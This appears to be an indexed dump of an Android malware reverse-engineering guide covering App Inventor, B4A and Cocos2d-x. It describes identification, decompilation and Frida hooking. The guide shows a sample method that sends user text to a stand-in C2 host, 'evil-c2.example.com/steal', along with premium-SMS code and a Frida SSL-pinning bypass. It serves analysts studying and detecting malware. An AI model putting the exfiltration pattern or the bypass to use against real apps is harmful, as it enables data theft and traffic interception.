MV/MZ JavaScript game engine in <code>assets/www/js/</code>, Cordova-wrapped 3 GDevelop HTML5 game code in <code>assets/www/</code>, Pixi.js readable 4 PWA / TWA Web code visible via browser DevTools, thin native wrapper 5 B4A Generates standard Java classes, fully decompilable with jadx 6 AppInventor / Kodular Generated Java code, decompiles cleanly with jadx 7 Xamarin (Mono) .NET DLLs decompile to near-source C# 8 Unity (Mono) Same as Xamarin -- .NET DLLs in <code>assets/bin/Data/Managed/</code> 9 Kotlin Multiplatform Standard DEX, analyzed with jadx like any native app 10 Compose Multiplatform Standard DEX with Compose UI classes, jadx works 11 libGDX Java game framework, standard DEX decompilation 12 NativeScript JavaScript bundles, similar to React Native 13 React Native (JSC) Minified but readable JavaScript bundle 14 Titanium JavaScript in <code>assets/Resources/</code>, V8 execution 15 uni-app Vue-based JS in <code>assets/apps/</code>, WebView or V8 16 React Native (Hermes) Requires Hermes bytecode decompilation 17 Kivy Python bytecode (.pyc) decompilable but sometimes encrypted 18 Ren'Py Python + compiled .rpyc scripts, decompilable with unrpyc 19 Corona / Solar2D Lua bytecode decompilation, sometimes encrypted 20 Defold Lua scripts in .arcd archive, extractable but custom format 21 GameMaker Proprietary data.droid format, limited tooling 22 Godot GDScript in .pck extractable, but GDNative/C++ modules are native 23 Unity (IL2CPP) Il2CppDumper + Ghidra, but metadata preserves symbols 24 Flutter AOT-compiled Dart with stripped symbols, requires blutter 25 Felgo Qt-based native with QML scripting layer 26 Delphi Object Pascal compiled to native ARM, minimal metadata 27 Qt for Android Pure native C++ with Qt abstractions, minimal metadata 28 Unreal Engine Heavy native C++ with UE abstractions, massive binary"},{"location":"reversing/frameworks/#malware-use-of-frameworks","title":"Malware Use of Frameworks","text":"Framework Known Malware Motivation Native (Java/Kotlin) Cerberus, GodFather, Anatsa, Octo, Hook, Vultur Full API access, mature packing ecosystem Flutter FluHorse AOT compilation defeats jadx, cross-platform React Native Phishing campaigns, fake banking apps Rapid cross-platform development Cordova / Ionic SpyLoan, predatory lending apps Fastest development cycle, web skills sufficient Unity Goldoson SDK in legitimate games SDK embedding for massive install base .NET MAUI Data theft campaigns C# in blob files evades DEX-based scanning B4A Commodity RATs, SMS stealers Low barrier to entry, drag-and-drop IDE AppInventor / Kodular Low-sophistication spyware, stalkerware No-code development, used by non-programmers Titanium Phishing apps (historical) Rapid JS-based development, declining usage uni-app Chinese market phishing, gambling apps Dominant in Chinese app ecosystem <p>Framework choice correlates with threat actor sophistication. Banking trojan operators prefer native Android for maximum control and access to commercial packers. Less sophisticated actors building phishing or data harvesting campaigns choose web-based frameworks for speed. Flutter adoption by malware authors is increasing as its AOT compilation provides a free obfuscation layer that defeats the standard jadx pipeline.</p>"},{"location":"reversing/frameworks/#detection-challenges","title":"Detection Challenges","text":"Framework Scanner Challenge Why Flutter No DEX code to scan All logic in native <code>libapp.so</code>, invisible to DEX-based pattern matching .NET MAUI Logic in blob files C# assemblies stored outside DEX, most scanners skip them React Native (Hermes) Bytecode format Hermes bytecode requires specialized decompilation tooling Cordova / hybrid JavaScript not scanned Most Android AV engines focus on DEX; JS in <code>assets/www/</code> is ignored Unity (IL2CPP) Native compilation Game logic compiled to <code>libil2cpp.so</code>, no DEX representation <p>Android security scanners (Play Protect, VirusTotal engines) were designed to analyze DEX bytecode. Cross-platform frameworks that store logic in JavaScript bundles, .NET assemblies, Dart AOT snapshots, or native compiled libraries bypass the primary scanning pipeline. This creates a structural detection gap that malware authors exploit.</p>"},{"location":"reversing/frameworks/#tools-summary","title":"Tools Summary","text":"Tool Framework Target Purpose jadx Native Android, KMP, B4A DEX to Java decompilation dnSpy / ILSpy Xamarin, Unity (Mono) .NET IL decompilation to C# blutter Flutter Dart AOT snapshot analysis, symbol recovery reFlutter Flutter SSL bypass and snapshot extraction Il2CppDumper Unity (IL2CPP) Metadata extraction, C# stub generation Cpp2IL Unity (IL2CPP) Alternative IL2CPP analyzer hbctool React Native (Hermes) Hermes bytecode disassembly hermes-dec React Native (Hermes) Hermes bytecode decompilation gdsdecomp Godot .pck resource extraction and GDScript recovery unluac Corona/Solar2D, Cocos2d-x Lua bytecode decompilation Frida All frameworks Runtime instrumentation and hooking Ghidra Flutter, Unity (IL2CPP), Qt, UE, native Native ARM code analysis"},{"location":"reversing/frameworks/appinventor/","title":"MIT App Inventor / Kodular / Thunkable","text":"<p>MIT App Inventor and its derivatives (Kodular, Thunkable) are visual block-programming platforms that generate standard Android APKs from drag-and-drop logic. The user builds screens and logic using Scratch-like blocks in a web browser, and the platform's server-side compiler translates those blocks into Java source code, compiles it to DEX, and packages it with the App Inventor runtime libraries. The resulting APK is a standard Android application -- no custom VM, no embedded interpreter, no bytecode format. All code lives in conventional DEX and decompiles with jadx like any native Android app.</p>"},{"location":"reversing/frameworks/appinventor/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/appinventor/#compilation-pipeline","title":"Compilation Pipeline","text":"<p>The block-to-APK pipeline works entirely server-side:</p> Stage Output Block editor JSON representation of visual blocks (<code>.bky</code> / <code>.scm</code> files) YAIL generation Blocks are converted to YAIL (Young Android Intermediate Language), a Scheme-like DSL Java code generation YAIL is compiled to Java source code using the App Inventor runtime API Standard Android build Java is compiled to <code>.class</code> files, then to DEX via d8/dx, packaged as APK <p>The final APK contains standard DEX bytecode. There is no runtime interpreter for blocks -- all block logic becomes Java method calls against the App Inventor component library (e.g., <code>com.google.appinventor.components.runtime.Button</code>, <code>com.google.appinventor.components.runtime.WebViewer</code>).</p>"},{"location":"reversing/frameworks/appinventor/#runtime-library","title":"Runtime Library","text":"<p>Every App Inventor APK ships with the full runtime library, regardless of which components the app uses. This adds a consistent set of classes under <code>com.google.appinventor.components.runtime.*</code> and supporting packages. The runtime handles:</p> <ul> <li>Component lifecycle management</li> <li>Event dispatch from UI elements to generated handler methods</li> <li>Permission requests</li> <li>Inter-component communication</li> </ul>"},{"location":"reversing/frameworks/appinventor/#kodular-thunkable-variants","title":"Kodular / Thunkable Variants","text":"<p>Kodular and Thunkable fork the App Inventor codebase and add proprietary extensions:</p> Platform Package Prefix Notable Differences MIT App Inventor <code>com.google.appinventor.*</code> Original, open-source runtime Kodular <code>com.google.appinventor.*</code> (reused) + <code>io.makeroid.*</code> Additional monetization components (AdMob, Facebook Ads), custom UI extensions Thunkable <code>com.thunkable.*</code> Cross-platform (Android + iOS), different component set"},{"location":"reversing/frameworks/appinventor/#identification","title":"Identification","text":"Indicator Location <code>assets/youngandroidproject/</code> Project metadata directory (definitive indicator) <code>assets/youngandroidproject/project.properties</code> Build properties file <code>com.google.appinventor.components.runtime.*</code> Runtime library classes in DEX <code>appinventor.ai_*</code> Default package prefix for user projects (e.g., <code>appinventor.ai_john.HelloWorld</code>) <code>io.makeroid.*</code> Kodular-specific extensions <code>com.thunkable.*</code> Thunkable-specific runtime <code>Screen1.java</code> / <code>Screen1</code> activity Default first screen name <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(youngandroidproject|appinventor)\"\n</code></pre> <p>The <code>assets/youngandroidproject/project.properties</code> file contains the original project name, author email (often visible in the package name as <code>appinventor.ai_&lt;email&gt;</code>), and build timestamp.</p>"},{"location":"reversing/frameworks/appinventor/#code-location-extraction","title":"Code Location &amp; Extraction","text":"<p>All app logic compiles into standard DEX. There is no separate script file, bytecode bundle, or asset-embedded code to extract. Decompilation follows the standard Android workflow:</p> <pre><code>jadx -d output/ target.apk\n</code></pre>"},{"location":"reversing/frameworks/appinventor/#generated-code-structure","title":"Generated Code Structure","text":"<p>App Inventor generates a predictable Java class hierarchy:</p> Class Purpose <code>Screen1</code> (extends <code>Form</code>) Main activity, contains all component initialization and event handlers <code>Screen2</code>, <code>Screen3</code>, etc. Additional screens <code>com.google.appinventor.components.runtime.Form</code> Base activity class <code>com.google.appinventor.components.runtime.*</code> All UI and logic components <p>Each screen is a single class containing all event handler methods for that screen's components. A button click handler, for example, becomes a method like <code>Button1Click()</code> on the screen class.</p>"},{"location":"reversing/frameworks/appinventor/#generated-code-patterns","title":"Generated Code Patterns","text":"<p>App Inventor's code generator produces distinctive Java patterns. Recognizing these helps separate auto-generated boilerplate from actual app logic.</p> <p>Component initialization (in the screen's <code>$define()</code> method):</p> <pre><code>private void $define() {\n    this.Button1 = new Button(this);\n    this.Button1.Text(\"Send Data\");\n    this.WebViewer1 = new WebViewer(this);\n    this.WebViewer1.HomeUrl(\"https://evil-c2.example.com/panel\");\n    this.TextBox1 = new TextBox(this);\n}\n</code></pre> <p>Event dispatcher pattern (the central dispatch method):</p> <pre><code>public boolean dispatchEvent(Component component, String eventName, String componentName, Object[] params) {\n    if (component.equals(this.Button1) &amp;&amp; eventName.equals(\"Click\")) {\n        Button1Click();\n        return true;\n    }\n    if (component.equals(this.Clock1) &amp;&amp; eventName.equals(\"Timer\")) {\n        Clock1Timer();\n        return true;\n    }\n    return false;\n}\n</code></pre> <p>Web request pattern (data exfiltration in block-built spyware):</p> <pre><code>private void Button1Click() {\n    this.Web1.Url(\"https://evil-c2.example.com/steal?data=\" + this.TextBox1.Text());\n    this.Web1.Get();\n}\n</code></pre> <p>SMS sending pattern:</p> <pre><code>private void Button1Click() {\n    this.Texting1.PhoneNumber(this.TextBox1.Text());\n    this.Texting1.Message(\"Premium SMS content\");\n    this.Texting1.SendMessage();\n}\n</code></pre> <p>All variable names match the component names assigned in the visual editor (e.g., <code>Button1</code>, <code>WebViewer1</code>, <code>TextBox1</code>). These names are rarely obfuscated because the platforms do not offer renaming or obfuscation features.</p>"},{"location":"reversing/frameworks/appinventor/#analysis-workflow","title":"Analysis Workflow","text":"<ol> <li>Unzip APK and confirm App Inventor origin (<code>assets/youngandroidproject/</code>)</li> <li>Check <code>project.properties</code> for author email, project name, build date</li> <li>Decompile with jadx -- focus on screen classes (<code>Screen1</code>, <code>Screen2</code>, etc.)</li> <li>Read <code>$define()</code> to enumerate all components and their initial configuration (URLs, phone numbers, API keys)</li> <li>Read <code>dispatchEvent()</code> to map UI events to handler methods</li> <li>Trace handler methods for data exfiltration (Web component), SMS abuse (Texting component), file access (File component)</li> <li>Search for hardcoded URLs -- C2 endpoints are almost always plaintext string literals</li> </ol>"},{"location":"reversing/frameworks/appinventor/#key-components-to-watch","title":"Key Components to Watch","text":"Component Abuse Potential <code>Web</code> HTTP requests to C2, data exfiltration via GET/POST <code>Texting</code> Premium SMS fraud, SMS spam <code>PhoneCall</code> Premium number dialing <code>ContactPicker</code> / <code>PhoneNumberPicker</code> Contact harvesting <code>LocationSensor</code> GPS tracking <code>Camera</code> / <code>Camcorder</code> Covert photo/video capture <code>File</code> Read/write to external storage <code>TinyDB</code> / <code>TinyWebDB</code> Local and remote key-value storage (exfiltration via TinyWebDB) <code>Clock</code> Timer-based triggers for periodic data collection <code>Notifier</code> Fake alerts, social engineering dialogs <code>ActivityStarter</code> Launch other apps, open URLs"},{"location":"reversing/frameworks/appinventor/#hooking","title":"Hooking","text":"<p>App Inventor apps use standard Java classes -- no custom VM or interpreter layer. Frida hooks target the runtime component methods directly:</p>"},{"location":"reversing/frameworks/appinventor/#intercept-all-web-requests","title":"Intercept All Web Requests","text":"<pre><code>Java.perform(function() {\n    var Web = Java.use(\"com.google.appinventor.components.runtime.Web\");\n\n    Web.Get.implementation = function() {\n        console.log(\"[Web.Get] URL: \" + this.Url());\n        this.Get();\n    };\n\n    Web.PostText.implementation = function(text) {\n        console.log(\"[Web.PostText] URL: \" + this.Url() + \" Body: \" + text);\n        this.PostText(text);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/appinventor/#intercept-sms-sending","title":"Intercept SMS Sending","text":"<pre><code>Java.perform(function() {\n    var Texting = Java.use(\"com.google.appinventor.components.runtime.Texting\");\n\n    Texting.SendMessage.implementation = function() {\n        console.log(\"[SMS] To: \" + this.PhoneNumber() + \" Msg: \" + this.Message());\n        this.SendMessage();\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/appinventor/#intercept-location-reads","title":"Intercept Location Reads","text":"<pre><code>Java.perform(function() {\n    var LocationSensor = Java.use(\"com.google.appinventor.components.runtime.LocationSensor\");\n\n    LocationSensor.Latitude.implementation = function() {\n        var lat = this.Latitude();\n        console.log(\"[Location] Latitude: \" + lat);\n        return lat;\n    };\n\n    LocationSensor.Longitude.implementation = function() {\n        var lon = this.Longitude();\n        console.log(\"[Location] Longitude: \" + lon);\n        return lon;\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/appinventor/#obfuscation","title":"Obfuscation","text":"<p>App Inventor, Kodular, and Thunkable do not provide any code obfuscation. The generated APKs ship with unobfuscated component names, plaintext string literals for all URLs and API keys, no R8/ProGuard processing, and the full runtime library with debug-friendly class names.</p>"},{"location":"reversing/frameworks/appinventor/#malware-context","title":"Malware Context","text":"<p>App Inventor and its derivatives are the primary tool for non-programmer threat actors building Android malware. The visual block interface requires zero coding ability, lowering the barrier to creating functional spyware and fraud tools.</p> Use Case Details Stalkerware Location tracking, SMS reading, contact exfiltration built by non-technical individuals targeting domestic partners Educational malware Students and script kiddies building proof-of-concept spyware from YouTube tutorials Premium SMS fraud Timer-triggered SMS sending to premium-rate numbers Credential phishing Simple apps with fake login forms that POST credentials to a C2 endpoint via the Web component Scam apps Fake utility apps (battery boosters, WiFi hackers) that display ads or harvest data Adware Kodular apps built solely to display interstitial ads, sometimes with deceptive UI"},{"location":"reversing/frameworks/appinventor/#characteristics-of-app-inventor-malware","title":"Characteristics of App Inventor Malware","text":"<ul> <li>Low sophistication -- no accessibility abuse, no overlay injection, no ATS, no dynamic code loading</li> <li>Plaintext C2 -- server URLs and API keys are always visible in decompiled source</li> <li>Identifiable authors -- the <code>appinventor.ai_&lt;email&gt;</code> package prefix often contains the author's real email address</li> <li>No persistence -- no boot receivers, no foreground services, no device admin abuse</li> <li>Single-purpose -- each sample typically does one thing (track location, send SMS, steal contacts)</li> <li>High volume, low impact -- Google Play Protect catches most of these; they survive primarily on sideloading and third-party stores</li> </ul> <p>Prevalence</p> <p>App Inventor-based malware accounts for a significant portion of low-sophistication Android threats seen on third-party app stores and sideloading sites. The <code>appinventor.ai_*</code> package prefix is a reliable triage signal for classifying a sample as low-skill, likely stalkerware or scam.</p>"},{"location":"reversing/frameworks/appinventor/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Standard DEX (Java) Readability Very high -- unobfuscated, descriptive component names String extraction Trivial -- all plaintext Control flow recovery Full -- standard Java decompilation Patching Standard APK patching (smali editing or jadx export) Obfuscation ceiling None -- platforms offer no obfuscation Overall difficulty Very Easy <p>App Inventor apps are among the easiest Android applications to reverse engineer. The generated code is verbose but completely transparent, with no obfuscation, no native code, and no custom bytecode. A single jadx pass reveals all functionality.</p>"},{"location":"reversing/frameworks/appinventor/#references","title":"References","text":"<ul> <li>MIT App Inventor -- Official Site</li> <li>MIT App Inventor -- GitHub</li> <li>Kodular -- Official Site</li> <li>Thunkable -- Official Site</li> <li>jadx -- Dex to Java Decompiler</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> </ul>"},{"location":"reversing/frameworks/b4a/","title":"B4A (Basic4Android)","text":"<p>B4A is a RAD (Rapid Application Development) tool from Anywhere Software that compiles a Visual Basic-like language into standard Java bytecode. The resulting APK contains regular DEX files with fully decompilable Java classes -- jadx produces clean output with predictable naming patterns. From a reverse engineering perspective, B4A apps are among the easiest Android targets: no native code, no custom runtimes, no bytecode formats to decode. The entire application logic sits in standard Dalvik bytecode wrapped in B4A's generated class hierarchy.</p> <p>B4A has become one of the most popular frameworks for commodity Android malware. Its drag-and-drop IDE requires no programming experience, making it accessible to low-skilled threat actors. The IRATA banking trojan, Copybara variants, and numerous SMS stealers targeting Middle Eastern and South Asian users are built with B4A.</p>"},{"location":"reversing/frameworks/b4a/#architecture","title":"Architecture","text":"<p>B4A compiles BASIC source code through this pipeline:</p> <pre><code>B4A BASIC source (.b4a) \u2192 Java code generation \u2192 javac \u2192 DEX compilation \u2192 Standard APK\n</code></pre> <p>The output is a conventional Android APK with no embedded runtime, no interpreter, and no custom bytecode format. The generated Java code follows rigid structural patterns that make it immediately recognizable when decompiled.</p>"},{"location":"reversing/frameworks/b4a/#generated-class-structure","title":"Generated Class Structure","text":"Class Purpose <code>b4a_main</code> Main activity, entry point <code>b4a_&lt;modulename&gt;</code> Each B4A module becomes a class with this prefix <code>anywheresoftware.b4a.BA</code> Core orchestrator class -- manages events, lifecycle, module communication <code>anywheresoftware.b4a.BALayout</code> Layout management <code>anywheresoftware.b4a.objects.*</code> Wrapper classes for Android components (views, drawables, streams) <code>anywheresoftware.b4a.phone.*</code> Phone API wrappers (SMS, contacts, call log, telephony) <code>anywheresoftware.b4a.net.*</code> Networking wrappers (HTTP, FTP, SMTP)"},{"location":"reversing/frameworks/b4a/#event-handler-naming-convention","title":"Event Handler Naming Convention","text":"<p>B4A generates event handler methods using an underscore-delimited naming convention:</p> B4A Source Generated Java Method <code>Sub Activity_Create(FirstTime As Boolean)</code> <code>_activity_create(boolean)</code> <code>Sub Activity_Resume</code> <code>_activity_resume()</code> <code>Sub Activity_Pause(UserClosed As Boolean)</code> <code>_activity_pause(boolean)</code> <code>Sub Button1_Click</code> <code>_button1_click()</code> <code>Sub Timer1_Tick</code> <code>_timer1_tick()</code> <p>Methods containing an underscore are preserved during B4A's built-in obfuscation. Methods without an underscore get renamed in release (obfuscated) builds. This means event handlers and lifecycle methods always retain their original names, even in obfuscated samples.</p>"},{"location":"reversing/frameworks/b4a/#identification","title":"Identification","text":"Indicator Location <code>anywheresoftware.b4a.*</code> Package prefix in DEX -- core B4A runtime classes <code>anywheresoftware.b4a.BA</code> Central orchestrator class, present in every B4A app <code>b4a_main</code> Generated main activity class <code>assets/*.bal</code> B4A layout files (binary format) <code>b4a_&lt;name&gt;</code> classes Each B4A code module generates a class with this prefix B4A library references <code>anywheresoftware.b4a.objects.*</code>, <code>anywheresoftware.b4a.phone.*</code> <pre><code>unzip -l target.apk | grep -iE \"(\\.bal|anywheresoftware)\"\n</code></pre> <p>Quick class check with jadx:</p> <pre><code>jadx --no-res -d output/ target.apk\ngrep -r \"anywheresoftware.b4a\" output/ | head -5\n</code></pre>"},{"location":"reversing/frameworks/b4a/#analysis-workflow","title":"Analysis Workflow","text":""},{"location":"reversing/frameworks/b4a/#decompilation","title":"Decompilation","text":"<p>Standard jadx decompilation works without any special tooling:</p> <pre><code>jadx -d decompiled/ target.apk\n</code></pre> <p>The decompiled output contains clean Java code. B4A's code generation produces straightforward, sequential logic without complex abstractions.</p>"},{"location":"reversing/frameworks/b4a/#navigating-generated-code","title":"Navigating Generated Code","text":"<ol> <li>Start at <code>b4a_main</code> -- this is the entry point, equivalent to the main Activity</li> <li>Look for <code>_activity_create</code> -- this is where initialization logic runs (network setup, service starts, permission requests)</li> <li>Trace event handlers -- <code>_button_click</code>, <code>_timer_tick</code>, <code>_httpjob_responsesuccess</code> reveal the app's behavior flow</li> <li>Check the <code>BA</code> class -- <code>anywheresoftware.b4a.BA</code> orchestrates all module communication and event dispatching</li> <li>Search for <code>anywheresoftware.b4a.phone</code> -- these wrappers handle SMS, contacts, call logs, and telephony operations</li> </ol>"},{"location":"reversing/frameworks/b4a/#decompiled-code-patterns","title":"Decompiled Code Patterns","text":"<p>B4A-generated code follows predictable patterns. A typical HTTP request in decompiled output:</p> <pre><code>public void _httpjob_responsesuccess(Object response) {\n    this._result = ((HttpJob) response).GetString();\n    anywheresoftware.b4a.BA.Log(\"Response: \" + this._result);\n}\n</code></pre> <p>SMS operations appear as:</p> <pre><code>public void _sendsms(String number, String body) {\n    this._sms.Send(number, body);\n}\n</code></pre>"},{"location":"reversing/frameworks/b4a/#obfuscation-handling","title":"Obfuscation Handling","text":"<p>B4A's built-in obfuscation (enabled in release mode) renames subs that lack an underscore. Event handlers like <code>_activity_create</code> and <code>_button1_click</code> are never renamed because the underscore signals B4A to preserve them. The obfuscation is weak -- class structure, string literals, and API calls remain fully visible.</p>"},{"location":"reversing/frameworks/b4a/#hooking","title":"Hooking","text":"<p>B4A apps use standard Java classes in DEX. All standard Android Frida hooks work without modification:</p> <pre><code>Java.perform(function() {\n    var ba = Java.use(\"anywheresoftware.b4a.BA\");\n    ba.LogImpl.implementation = function(tag, msg, logLevel) {\n        console.log(\"[B4A Log] \" + msg);\n        this.LogImpl(tag, msg, logLevel);\n    };\n});\n</code></pre> <p>Hook specific module methods:</p> <pre><code>Java.perform(function() {\n    var main = Java.use(\"com.example.app.b4a_main\");\n    main._activity_create.implementation = function(firstTime) {\n        console.log(\"[B4A] Activity_Create called, firstTime=\" + firstTime);\n        this._activity_create(firstTime);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/b4a/#intercepting-network-operations","title":"Intercepting Network Operations","text":"<p>B4A apps commonly use the <code>HttpJob</code> class for networking:</p> <pre><code>Java.perform(function() {\n    var HttpJob = Java.use(\"anywheresoftware.b4a.http.HttpModule$HttpJob\");\n    HttpJob.Download.implementation = function(url) {\n        console.log(\"[B4A HTTP] Download: \" + url);\n        this.Download(url);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/b4a/#intercepting-sms-operations","title":"Intercepting SMS Operations","text":"<p>For malware analysis, hooking SMS-related classes is critical:</p> <pre><code>Java.perform(function() {\n    var PhoneSms = Java.use(\"anywheresoftware.b4a.phone.PhoneSms\");\n    PhoneSms.Send.implementation = function(number, body) {\n        console.log(\"[B4A SMS] To: \" + number + \" Body: \" + body);\n        this.Send(number, body);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/b4a/#ssl-pinning","title":"SSL Pinning","text":"<p>B4A networking uses standard Java HTTP libraries (OkHttp or <code>HttpURLConnection</code>) under the hood. Standard Java-layer SSL bypass scripts work:</p> <pre><code>Java.perform(function() {\n    var TrustManagerImpl = Java.use(\"com.android.org.conscrypt.TrustManagerImpl\");\n    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {\n        console.log(\"[SSL] Bypassed for: \" + host);\n        return untrustedChain;\n    };\n});\n</code></pre> <p>No framework-specific bypass required. Objection's <code>android sslpinning disable</code> also works out of the box.</p>"},{"location":"reversing/frameworks/b4a/#malware-context","title":"Malware Context","text":"<p>B4A is one of the most prolific frameworks for commodity Android malware. The low barrier to entry -- a visual IDE with drag-and-drop components and BASIC syntax -- means threat actors with minimal programming skills can build functional malware.</p>"},{"location":"reversing/frameworks/b4a/#irata-iranian-remote-access-trojan","title":"IRATA (Iranian Remote Access Trojan)","text":"<p>IRATA is the most documented B4A malware family. First discovered in August 2022 following smishing campaigns targeting Iranian users, it has since expanded to target users in Italy and other regions.</p> Aspect Details Framework B4A (Basic4Android) Distribution SMS phishing (smishing) with links to fake government websites Capabilities SMS interception, contact harvesting, call log collection, USSD execution C2 Firebase Cloud Messaging for command dispatch Identification <code>anywheresoftware.b4a.*</code> classes, <code>CallLogWrapper</code> for call log exfiltration Analysis reference muha2xmad technical analysis <p>The decompiled IRATA code reveals <code>anywheresoftware.b4a.phone.*</code> wrapper classes used to collect call logs (date, type, duration, number), contacts (name, number, times contacted, email), and intercept SMS messages.</p>"},{"location":"reversing/frameworks/b4a/#copybara-brata-variants","title":"Copybara / BRATA Variants","text":"<p>The BRATA banking trojan family includes variants built with the B4A/B4X suite. These use B4A's rapid development capabilities to quickly iterate on phishing overlays for banking apps.</p>"},{"location":"reversing/frameworks/b4a/#common-b4a-malware-patterns","title":"Common B4A Malware Patterns","text":"Category Prevalence Typical Behavior SMS stealers Very high Intercept OTP codes, forward to C2 Banking phishing High Overlay fake login screens, harvest credentials RATs Moderate Remote device control via Firebase or raw TCP Contact harvesters High Exfiltrate contact lists for spam campaigns USSD fraud Moderate Execute USSD codes for airtime/balance theft"},{"location":"reversing/frameworks/b4a/#regional-distribution","title":"Regional Distribution","text":"<p>B4A malware is heavily concentrated in:</p> <ul> <li>Iran -- IRATA and related banking trojans distributed via smishing</li> <li>Middle East -- SMS stealers targeting Arabic-speaking users</li> <li>South Asia -- Commodity RATs and SMS interceptors targeting Indian and Pakistani users</li> <li>North Africa -- Low-sophistication spyware and contact harvesters</li> </ul>"},{"location":"reversing/frameworks/b4a/#why-b4a-appeals-to-malware-authors","title":"Why B4A Appeals to Malware Authors","text":"<ul> <li>Zero programming barrier -- BASIC syntax with visual IDE, drag-and-drop UI builder</li> <li>Full Android API access -- SMS, contacts, call logs, telephony, camera all accessible through B4A wrappers</li> <li>Standard APK output -- no unusual runtime dependencies that might trigger heuristic detection</li> <li>Rapid iteration -- hot-reload development via B4A Bridge companion app</li> <li>Active community -- B4X forums provide extensive tutorials and code snippets that malware authors repurpose</li> </ul>"},{"location":"reversing/frameworks/b4a/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Standard DEX (Java bytecode) Decompilation Near-perfect with jadx String recovery Full -- all string literals visible Control flow Clear, sequential, predictable patterns Hooking Standard Java hooks, high effectiveness Patching Easy -- smali modification or jadx + recompile Obfuscation ceiling Weak -- B4A's built-in obfuscation is minimal Overall difficulty Easy (rank 5/28) <p>B4A apps are among the easiest Android targets to reverse engineer. The generated code is predictable, decompilation is clean, and all standard Android RE tools work without modification. The primary analysis effort is understanding B4A's naming conventions and class hierarchy, which are consistent across all B4A apps.</p>"},{"location":"reversing/frameworks/b4a/#references","title":"References","text":"<ul> <li>B4A -- Anywhere Software</li> <li>B4A Core Libraries Source -- GitHub</li> <li>IRATA Technical Analysis -- muha2xmad</li> <li>IRATA -- Malpedia</li> <li>Copybara Android Banking Trojan -- TineXta Cyber</li> <li>Iranian Mobile Banking Malware Campaign -- Zimperium</li> <li>B4A Code Obfuscation -- B4X Forum</li> </ul>"},{"location":"reversing/frameworks/cocos2d-x/","title":"Cocos2d-x","text":"<p>Cocos2d-x is a C++ game engine that supports three scripting modes on Android: Lua bindings, JavaScript bindings, and pure C++. The engine compiles to a native shared library (<code>libcocos2dlua.so</code>, <code>libcocos2djs.so</code>, or <code>libgame.so</code>) with optional scripting layers that store game logic as Lua or JavaScript files in the APK's <code>assets/</code> directory. Cocos2d-x is one of the most widely used mobile game engines globally, particularly in Asian markets, and its scripting variants appear in both legitimate apps and malware that disguises itself as gaming applications.</p>"},{"location":"reversing/frameworks/cocos2d-x/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/cocos2d-x/#engine-variants","title":"Engine Variants","text":"Variant Primary Library Script Location Scripting Language Cocos2d-x Lua <code>libcocos2dlua.so</code> <code>assets/src/</code> or <code>assets/res/</code> Lua 5.1 / LuaJIT Cocos2d-x JS <code>libcocos2djs.so</code> <code>assets/script/</code> or <code>assets/src/</code> JavaScript (SpiderMonkey) Cocos2d-x C++ <code>libgame.so</code> or <code>libcocos2dcpp.so</code> N/A (compiled into native lib) None Component Role Cocos2d-x Core C++ engine handling rendering, physics, audio, input Lua Binding (tolua++) Bridges Lua scripts to C++ engine classes via auto-generated bindings JS Binding (SpiderMonkey) Mozilla's JS engine with C++ bindings for Cocos2d-x APIs FileUtils Unified file resolution system -- checks writable paths first, then assets <p>For the Lua variant, <code>libcocos2dlua.so</code> initializes the engine and Lua VM, then <code>FileUtils</code> loads <code>main.lua</code> from <code>assets/src/</code>. For the JS variant, <code>libcocos2djs.so</code> initializes SpiderMonkey and loads <code>main.js</code> from <code>assets/script/</code>. Both scripting variants drive game logic through <code>cc.*</code> API bindings.</p>"},{"location":"reversing/frameworks/cocos2d-x/#identification","title":"Identification","text":"Indicator Location <code>libcocos2dlua.so</code> Lua-scripted Cocos2d-x app <code>libcocos2djs.so</code> JS-scripted Cocos2d-x app <code>libcocos2dcpp.so</code> or <code>libgame.so</code> Pure C++ Cocos2d-x app <code>org.cocos2dx.*</code> Package prefix in DEX classes <code>org.cocos2dx.lib.Cocos2dxActivity</code> Base activity class <code>assets/src/*.lua</code> or <code>assets/src/*.luac</code> Lua script files <code>assets/script/*.js</code> or <code>assets/script/*.jsc</code> JavaScript files <pre><code>unzip -l target.apk | grep -E \"(libcocos2d|cocos2dx|\\.lua$|\\.luac$|\\.jsc$)\"\n</code></pre>"},{"location":"reversing/frameworks/cocos2d-x/#lua-variant-extraction-analysis","title":"Lua Variant -- Extraction &amp; Analysis","text":"<p>Lua scripts reside in <code>assets/src/</code> with the entry point at <code>main.lua</code>:</p> <pre><code>unzip target.apk \"assets/src/*\" -d extracted/\nfind extracted/assets/src/ -name \"*.lua\" -o -name \"*.luac\" | head -30\n</code></pre> <p>If <code>.lua</code> files are plaintext, analysis is direct:</p> <pre><code>grep -rn \"cc\\.FileUtils\\|cc\\.Application\\|http\\|socket\\|network\" extracted/assets/src/\ngrep -rn \"crypto\\|encrypt\\|decode\\|key\\|password\" extracted/assets/src/\n</code></pre> <p>Files with <code>.luac</code> extension or <code>.lua</code> files starting with <code>\\x1bLua</code> are compiled Lua bytecode. Decompile with unluac:</p> <pre><code>java -jar unluac.jar extracted/assets/src/main.luac &gt; main.lua\n</code></pre>"},{"location":"reversing/frameworks/cocos2d-x/#xxtea-encryption","title":"XXTEA Encryption","text":"<p>XXTEA is the most common encryption scheme for Lua scripts in Cocos2d-x. The engine's <code>FileUtils</code> class decrypts scripts at load time using a key compiled into the native library.</p> <p>Indicators of XXTEA encryption:</p> <ul> <li><code>.lua</code> or <code>.luac</code> files that do not start with <code>\\x1bLua</code></li> <li>Files may start with a custom signature followed by encrypted data</li> <li>All script files have similar high-entropy byte distributions</li> </ul> <p>The key is stored in the native library, passed to <code>FileUtils::setXXTEAKeyAndSign()</code>. Extract it statically:</p> <pre><code>strings libcocos2dlua.so | grep -A2 -B2 \"XXTEA\"\n</code></pre> <p>Or extract at runtime with Frida:</p> <pre><code>var cocos = 